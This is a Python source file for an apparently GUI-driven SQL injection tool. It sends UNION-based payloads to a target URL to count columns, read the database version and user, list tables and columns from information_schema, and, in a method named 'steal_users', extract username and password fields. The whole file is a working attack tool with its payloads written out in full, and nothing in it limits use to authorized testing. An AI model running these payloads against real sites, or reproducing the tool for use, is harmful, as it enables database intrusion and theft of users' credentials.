from tkinter import END

import requests
import re


class Sql:
    value = ''

    def __init__(self):
        self.s = requests.Session()

    def injector(self, injected):
        errors = ['Mysql', 'in your SQL', 'Error']
        results = []
        for y in injected:
            print("[-] Testing errors: " + y)
            req = self.s.get(y)
            for x in errors:
                if x in req.text:
                    res = y + ";" + x
                    results.append(res)
        return results

    def detect_columns(self, url):
        new_url = url.replace("FUZZ", "admin' order by X-- -")
        y = 1
        while y < 20:
            req = self.s.get(new_url.replace("X", str(y)))
            if "Error" not in req.text:
                if 'error' not in req.text:
                    if 'ERROR' not in req.text:
                        y += 1
                    else:
                        break
                else:
                    break
            else:
                break
        return str(y - 1)

    def detect_version(self, url):
        new_url = url.replace("FUZZ", "\'%20union%20SELECT%201,CONCAT('TOK',@@version,'TOK')--%20-")
        req = self.s.get(new_url)
        version = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
        return version

    def detect_user(self, url):
        new_url = url.replace("FUZZ", "\'%20union%20SELECT%201,CONCAT('TOK',user(),'TOK')--%20-")
        req = self.s.get(new_url)
        users = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
        return users

    def stringcolumn(self, num, url):
        if num == '1':
            new_url = url.replace("FUZZ", "1\'%20union%20SELECT%20'toktok'--%20-")
            req = self.s.get(new_url)
            if 'toktok' in req.text:
                return "the only column can hold string"
            else:
                return 'the only column cannot hold string'
        if num == '2':
            new_url = url.replace("FUZZ", "1\'%20union%20SELECT%20'toktok',NULL--%20-")
            req = self.s.get(new_url)
            if 'toktok' in req.text:
                return "the first column can hold string"
            else:
                new_url = url.replace("FUZZ", "1\'%20union%20SELECT%20NULL,'toktok'--%20-")
                req = self.s.get(new_url)
                if 'toktok' in req.text:
                    return "the second column can hold string"
                else:
                    return 'NO column cannot hold string'
        if num == '3':
            new_url = url.replace("FUZZ", "1\'%20union%20SELECT%20'toktok',NULL,NULL--%20-")
            req = self.s.get(new_url)
            if 'toktok' in req.text:
                return "the first column can hold string"
            else:
                new_url = url.replace("FUZZ", "1\'%20union%20SELECT%20NULL,'toktok',NULL--%20-")
                req = self.s.get(new_url)
                if 'toktok' in req.text:
                    return "the second column can hold string"
                else:
                    new_url = url.replace("FUZZ", "1\'%20union%20SELECT%20NULL,NULL,NULL'toktok'--%20-")
                    req = self.s.get(new_url)
                    if 'toktok' in req.text:
                        return "the third column can hold string"
                    else:
                        return 'NO column cannot hold string'

    def detect_table_names(self, vuln_object, num, url, string):
        if num == '1':
            if string == "the only column can hold string":
                new_url = url.replace("FUZZ",
                                      "\'%20union%20SELECT%20CONCAT('TOK',table_schema,'TOK','TOK',table_name,"
                                      "'TOK')%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20"
                                      "%27mysql%27 "
                                      "%20AND%20table_schema%20!=%20%27information_schema%27%20and%20table_schema%20"
                                      "!=%20 "
                                      "%27performance_schema%27%20--%20-")
                req = self.s.get(new_url)
                tables = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for table in tables:
                    vuln_object.listbox.insert(END, table)
            else:
                print('the only column cannot hold string')
        if num == '2':
            if string == "the first column can hold string":
                new_url = url.replace("FUZZ",
                                      "\'%20union%20SELECT%20CONCAT('TOK',table_schema,'TOK','TOK',table_name,"
                                      "'TOK'),NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20"
                                      "%27mysql%27 "
                                      "%20AND%20table_schema%20!=%20%27information_schema%27%20and%20table_schema%20"
                                      "!=%20 "
                                      "%27performance_schema%27%20--%20-")
                req = self.s.get(new_url)
                tables = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for table in tables:
                    vuln_object.listbox.insert(END, table)
            elif string == "the second column can hold string":
                new_url = url.replace("FUZZ",
                                      "\'%20union%20SELECT%20NULL,CONCAT('TOK',table_schema,'TOK','TOK',table_name,"
                                      "'TOK')%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20"
                                      "%27mysql%27 "
                                      "%20AND%20table_schema%20!=%20%27information_schema%27%20and%20table_schema%20"
                                      "!=%20 "
                                      "%27performance_schema%27%20--%20-")
                req = self.s.get(new_url)
                tables = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for table in tables:
                    vuln_object.listbox.insert(END, table)
            else:
                print('NO column cannot hold string')
        if num == '3':
            if string == "the first column can hold string":
                new_url = url.replace("FUZZ",
                                      "\'%20union%20SELECT%20CONCAT('TOK',table_schema,'TOK','TOK',table_name,"
                                      "'TOK'),NULL, NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20"
                                      "!=%20 "
                                      "%27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27%20and"
                                      "%20table_schema%20!=%20%27performance_schema%27%20--%20-")
                req = self.s.get(new_url)
                tables = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for table in tables:
                    vuln_object.listbox.insert(END, table)
            elif string == "the second column can hold string":
                new_url = url.replace("FUZZ",
                                      "\'%20union%20SELECT%20CONCAT('TOK',table_schema,'TOK'),CONCAT('TOK',table_name,"
                                      "'TOK'),NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20"
                                      "%27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27%20and"
                                      "%20table_schema%20!=%20%27performance_schema%27%20--%20-")
                req = self.s.get(new_url)
                tables = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for table in tables:
                    vuln_object.listbox.insert(END, table)
            elif string == "the third column can hold string":
                new_url = url.replace("FUZZ",
                                      "\'%20union%20SELECT%20NULL,NULL,CONCAT('TOK',table_schema,'TOK','TOK',"
                                      "table_name, "
                                      "'TOK')%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20"
                                      "%27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27%20and"
                                      "%20table_schema%20!=%20%27performance_schema%27%20--%20-")
                req = self.s.get(new_url)
                tables = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for table in tables:
                    vuln_object.listbox.insert(END, table)
            else:
                print('NO column cannot hold string')

    def detect_columns_names(self, event, vuln_object, num, url, string):
        widget = event.widget
        selection = widget.curselection()
        Sql.value = widget.get(selection[0])
        if num == '1':
            if string == "the only column can hold string":
                new_url = url.replace("FUZZ", "\'%20union%20SELECT%20CONCAT('TOK',column_name,"
                                              "'TOK')%20FROM%20information_schema.columns%20WHERE table_name='" + Sql.value + "'--%20-")
                req = self.s.get(new_url)
                columns = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for column in columns:
                    vuln_object.listbox1.insert(END, column)
            else:
                print('the only column cannot hold string')
        if num == '2':
            if string == "the first column can hold string":
                new_url = url.replace("FUZZ", "\'%20union%20SELECT%20CONCAT('TOK',column_name,"
                                              "'TOK'),NULL%20FROM%20information_schema.columns%20WHERE table_name='" + Sql.value + "'--%20-")
                req = self.s.get(new_url)
                columns = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for column in columns:
                    vuln_object.listbox1.insert(END, column)
            elif string == "the second column can hold string":
                new_url = url.replace("FUZZ", "\'%20union%20SELECT%20NULL,CONCAT('TOK',column_name,"
                                              "'TOK')%20FROM%20information_schema.columns%20WHERE table_name='" + Sql.value + "'--%20-")
                req = self.s.get(new_url)
                columns = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for column in columns:
                    vuln_object.listbox1.insert(END, column)
            else:
                print('NO column cannot hold string')

        if num == '3':
            if string == "the first column can hold string":
                new_url = url.replace("FUZZ", "\'%20union%20SELECT%20CONCAT('TOK',column_name,"
                                              "'TOK'),NULL,NULL%20FROM%20information_schema.columns%20WHERE "
                                              "table_name='" + Sql.value + "'--%20-")
                req = self.s.get(new_url)
                columns = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for column in columns:
                    vuln_object.listbox1.insert(END, column)
            elif string == "the second column can hold string":
                new_url = url.replace("FUZZ", "\'%20union%20SELECT%20NULL,CONCAT('TOK',column_name,"
                                              "'TOK'),NULL%20FROM%20information_schema.columns%20WHERE table_name='" + Sql.value + "'--%20-")
                req = self.s.get(new_url)
                columns = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for column in columns:
                    vuln_object.listbox1.insert(END, column)
            elif string == "the third column can hold string":
                new_url = url.replace("FUZZ", "\'%20union%20SELECT%20NULL,NULL,CONCAT('TOK',column_name,"
                                              "'TOK')%20FROM%20information_schema.columns%20WHERE table_name='" + Sql.value + "'--%20-")
                req = self.s.get(new_url)
                columns = re.findall("TOK([a-zA-Z0-9].+?)TOK+?", req.text)
                for column in columns:
                    vuln_object.listbox1.insert(END, column)
            else:
                print('NO column cannot hold string')

    def steal_users(self, vuln_object, num, url, string):
        selection = vuln_object.listbox1.curselection()
        user = vuln_object.listbox1.get(selection[0])
        password = vuln_object.listbox1.get(selection[1])
        if num == '1':
            if string == "the only column can hold string":
                new_url = url.replace("FUZZ",
                                      "1\'%20union%20SELECT%20CONCAT('TOK'," + user + ",'TOK','TOK'," + password + ","
                                      "'TOK')%20FROM%20" + Sql.value + "--%20-")
                req = self.s.get(new_url)
                users = re.findall("TOK([\*a-zA-Z0-9].+?)TOK+?", req.text)
                for user in users:
                    vuln_object.listbox2.insert(END, user)
            else:
                print('the only column cannot hold string')
        if num == '2':
            if string == "the first column can hold string":
                new_url = url.replace("FUZZ",
                                      "1\'%20union%20SELECT%20CONCAT('TOK'," + user + ",'TOK','TOK'," + password + ","
                                      "'TOK'),NULL%20FROM%20" + Sql.value + "--%20-")
                req = self.s.get(new_url)
                users = re.findall("TOK([\*a-zA-Z0-9].+?)TOK+?", req.text)
                for user in users:
                    vuln_object.listbox2.insert(END, user)
            elif string == "the second column can hold string":
                new_url = url.replace("FUZZ",
                                      "1\'%20union%20SELECT%20NULL,CONCAT('TOK'," + user + ",'TOK','TOK'," + password + ","
                                      "'TOK')%20FROM%20" + Sql.value + "--%20-")
                req = self.s.get(new_url)
                users = re.findall("TOK([\*a-zA-Z0-9].+?)TOK+?", req.text)
                for user in users:
                    vuln_object.listbox2.insert(END, user)
            else:
                print('NO column cannot hold string')

        if num == '3':
            if string == "the first column can hold string":
                new_url = url.replace("FUZZ",
                                      "1\'%20union%20SELECT%20CONCAT('TOK'," + user + ",'TOK','TOK'," + password + ","
                                      "'TOK'),NULL,NULL%20FROM%20" + Sql.value + "--%20-")
                req = self.s.get(new_url)
                users = re.findall("TOK([\*a-zA-Z0-9].+?)TOK+?", req.text)
                for user in users:
                    vuln_object.listbox2.insert(END, user)
            elif string == "the second column can hold string":
                new_url = url.replace("FUZZ",
                                      "1\'%20union%20SELECT%20NULL,CONCAT('TOK'," + user + ",'TOK','TOK'," + password + ","
                                      "'TOK'),NULL%20FROM%20" + Sql.value + "--%20-")
                req = self.s.get(new_url)
                users = re.findall("TOK([\*a-zA-Z0-9].+?)TOK+?", req.text)
                for user in users:
                    vuln_object.listbox2.insert(END, user)
            elif string == "the third column can hold string":
                new_url = url.replace("FUZZ",
                                      "1\'%20union%20SELECT%20NULL,NULL,CONCAT('TOK'," + user + ",'TOK','TOK'," + password + ","
                                      "'TOK')%20FROM%20" + Sql.value + "--%20-")
                req = self.s.get(new_url)
                users = re.findall("TOK([\*a-zA-Z0-9].+?)TOK+?", req.text)
                for user in users:
                    vuln_object.listbox2.insert(END, user)
            else:
                print('NO column cannot hold string')
